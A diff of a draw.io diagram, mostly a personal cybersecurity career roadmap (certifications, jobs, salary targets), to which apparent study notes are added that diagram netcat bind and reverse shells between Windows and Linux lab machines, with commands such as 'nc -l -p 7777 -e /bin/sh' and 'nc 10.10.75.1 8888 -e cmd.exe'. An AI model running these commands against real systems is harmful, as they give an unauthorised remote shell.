@@ -1,23 +1,23 @@
 <mxfile host="app.diagrams.net" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36" version="26.0.10">
   <diagram name="Page-1" id="-1NyxRT7adJ_zUYWQrjk">
-    <mxGraphModel dx="2979" dy="2421" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
+    <mxGraphModel dx="2778" dy="2048" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
         <mxCell id="A5JljbkWxzZDJU76yjhS-1" value="Sec+" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="270" y="570" width="80" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="A5JljbkWxzZDJU76yjhS-2" value="Net+" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="110" y="730" width="80" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="A5JljbkWxzZDJU76yjhS-3" value="AWS CCP" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
           <mxGeometry x="190" y="650" width="80" height="80" as="geometry" />
         </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-2" value="Net+" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="30" y="810" width="80" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-3" value="AWS CCP" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="110" y="730" width="80" height="80" as="geometry" />
+        </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-4" value="Day 1: Deloitte" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="350" y="490" width="80" height="80" as="geometry" />
+          <mxGeometry x="270" y="570" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-5" value="85k" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="360" y="580" width="60" height="30" as="geometry" />
+          <mxGeometry x="280" y="650" width="60" height="30" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-6" value="Splunk Power User" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
           <mxGeometry x="430" y="410" width="80" height="80" as="geometry" />
@@ -38,40 +38,124 @@
           <mxGeometry x="830" y="10" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-12" value="Delayed 6 months" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="-50" y="890" width="80" height="80" as="geometry" />
+          <mxGeometry x="-130" y="970" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-14" value="Proxmox homelab" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
           <mxGeometry x="910" y="-70" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-15" value="Pi home lab" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="30" y="810" width="80" height="80" as="geometry" />
+          <mxGeometry x="-50" y="890" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-16" value="" style="shape=flexArrow;endArrow=classic;html=1;rounded=0;" edge="1" parent="1">
           <mxGeometry width="50" height="50" relative="1" as="geometry">
-            <mxPoint x="40" y="1000" as="sourcePoint" />
-            <mxPoint x="1120" y="-60" as="targetPoint" />
-            <Array as="points">
-              <mxPoint x="670" y="400" />
-            </Array>
+            <mxPoint x="70" y="1030" as="sourcePoint" />
+            <mxPoint x="1590" y="-500" as="targetPoint" />
+            <Array as="points" />
           </mxGeometry>
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-17" value="Arctic Wolf SE offer" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
           <mxGeometry x="990" y="-150" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-18" value="140 OTE" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="1000" y="-70" width="60" height="30" as="geometry" />
+          <mxGeometry x="1160" y="-230" width="60" height="30" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-19" value="SANS training" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
           <mxGeometry x="1070" y="-230" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-21" value="Senior SE" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="1170" y="-350" width="80" height="80" as="geometry" />
+          <mxGeometry x="1440" y="-560" width="80" height="80" as="geometry" />
         </mxCell>
-        <mxCell id="A5JljbkWxzZDJU76yjhS-22" value="" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
-          <mxGeometry x="1290" y="-240" width="80" height="80" as="geometry" />
+        <mxCell id="A5JljbkWxzZDJU76yjhS-22" value="Start at AW" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="1150" y="-310" width="80" height="80" as="geometry" />
         </mxCell>
         <mxCell id="A5JljbkWxzZDJU76yjhS-23" value="200 OTE" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
-          <mxGeometry x="1250" y="-310" width="60" height="30" as="geometry" />
+          <mxGeometry x="1370" y="-400" width="60" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-26" value="x% above quota" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="1360" y="-480" width="80" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-27" value="1 year" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="1080" y="-270" width="60" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-28" value="Splunk .conf" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="350" y="490" width="80" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-29" value="Siwss army knife" style="whiteSpace=wrap;html=1;aspect=fixed;" vertex="1" parent="1">
+          <mxGeometry x="1200" y="-540" width="80" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-30" value="" style="shape=mxgraph.cisco.computers_and_peripherals.laptop;sketch=0;html=1;pointerEvents=1;dashed=0;fillColor=#036897;strokeColor=#ffffff;strokeWidth=2;verticalLabelPosition=bottom;verticalAlign=top;align=center;outlineConnect=0;" vertex="1" parent="1">
+          <mxGeometry x="-500" y="-900" width="90" height="61" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-31" value="" style="shape=mxgraph.cisco.computers_and_peripherals.laptop;sketch=0;html=1;pointerEvents=1;dashed=0;fillColor=#036897;strokeColor=#ffffff;strokeWidth=2;verticalLabelPosition=bottom;verticalAlign=top;align=center;outlineConnect=0;" vertex="1" parent="1">
+          <mxGeometry x="-100" y="-910" width="90" height="61" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-33" value="nc -l -p 7777 -e /bin/sh" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-520" y="-930" width="160" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-34" value="nc 10.10.75.1 777" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-120" y="-940" width="160" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-35" value="" style="endArrow=classic;html=1;rounded=0;" edge="1" parent="1" source="A5JljbkWxzZDJU76yjhS-31">
+          <mxGeometry width="50" height="50" relative="1" as="geometry">
+            <mxPoint x="40" y="-840" as="sourcePoint" />
+            <mxPoint x="-400" y="-879" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-47" value="Windows connects to linux, which has a shell command" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="A5JljbkWxzZDJU76yjhS-35">
+          <mxGeometry x="0.0324" y="-1" relative="1" as="geometry">
+            <mxPoint x="15" y="-10" as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-36" value="" style="endArrow=classic;html=1;rounded=0;" edge="1" parent="1">
+          <mxGeometry width="50" height="50" relative="1" as="geometry">
+            <mxPoint x="-400" y="-850" as="sourcePoint" />
+            <mxPoint x="-110" y="-850" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-48" value="Shell is passed to windows" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="A5JljbkWxzZDJU76yjhS-36">
+          <mxGeometry x="0.0995" relative="1" as="geometry">
+            <mxPoint as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-37" value="Windows outgoing to linux, linux sends shell back to Windows - Linux backdoor shell" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-340" y="-970" width="220" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-38" value="" style="shape=mxgraph.cisco.computers_and_peripherals.laptop;sketch=0;html=1;pointerEvents=1;dashed=0;fillColor=#036897;strokeColor=#ffffff;strokeWidth=2;verticalLabelPosition=bottom;verticalAlign=top;align=center;outlineConnect=0;" vertex="1" parent="1">
+          <mxGeometry x="-500" y="-690" width="90" height="61" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-39" value="" style="shape=mxgraph.cisco.computers_and_peripherals.laptop;sketch=0;html=1;pointerEvents=1;dashed=0;fillColor=#036897;strokeColor=#ffffff;strokeWidth=2;verticalLabelPosition=bottom;verticalAlign=top;align=center;outlineConnect=0;" vertex="1" parent="1">
+          <mxGeometry x="-100" y="-700" width="90" height="61" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-40" value="nc -l -p 8888" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-520" y="-720" width="160" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-41" value="nc 10.10.75.1 8888 -e cmd.exe" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-120" y="-730" width="160" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-42" value="" style="endArrow=classic;html=1;rounded=0;" edge="1" parent="1" source="A5JljbkWxzZDJU76yjhS-39">
+          <mxGeometry width="50" height="50" relative="1" as="geometry">
+            <mxPoint x="40" y="-630" as="sourcePoint" />
+            <mxPoint x="-400" y="-669" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-45" value="Initiate connection to listener with shell" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="A5JljbkWxzZDJU76yjhS-42">
+          <mxGeometry x="-0.2381" y="1" relative="1" as="geometry">
+            <mxPoint x="-16" y="-12" as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-43" value="" style="endArrow=classic;html=1;rounded=0;" edge="1" parent="1">
+          <mxGeometry width="50" height="50" relative="1" as="geometry">
+            <mxPoint x="-400" y="-640" as="sourcePoint" />
+            <mxPoint x="-110" y="-640" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-46" value="Get cmd prompt and run commands on remote system" style="edgeLabel;html=1;align=center;verticalAlign=middle;resizable=0;points=[];" vertex="1" connectable="0" parent="A5JljbkWxzZDJU76yjhS-43">
+          <mxGeometry x="0.1862" y="-1" relative="1" as="geometry">
+            <mxPoint x="-32" y="10" as="offset" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="A5JljbkWxzZDJU76yjhS-44" value="Windows outgoing to linux, linux gets shell from Windows and executes reverse shell" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-350" y="-750" width="220" height="30" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
